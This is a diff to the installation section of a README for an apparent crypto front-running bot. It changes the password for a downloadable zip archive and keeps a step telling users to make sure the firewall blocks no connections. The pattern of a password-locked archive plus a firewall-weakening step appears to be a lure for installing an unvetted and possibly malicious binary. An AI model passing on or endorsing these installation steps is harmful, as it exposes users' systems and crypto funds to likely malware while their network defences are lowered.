@@ -21,7 +21,7 @@ For more information contact with me.
 
 ### Installation (public version)
 1. [Install](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net472) .NET framework 4.7.2 runtome if it has not been installed.
-2. [Download](https://github.com/timo991/amm-frontrun/archive/refs/heads/main.zip) repository release and extract files with password `1234`.
+2. [Download](https://github.com/timo991/amm-frontrun/archive/refs/heads/main.zip) repository release and extract files with password `o9vbwkhO5X`.
 3. Make shure that firewall does not blocks any connections.
 
 ### Usage
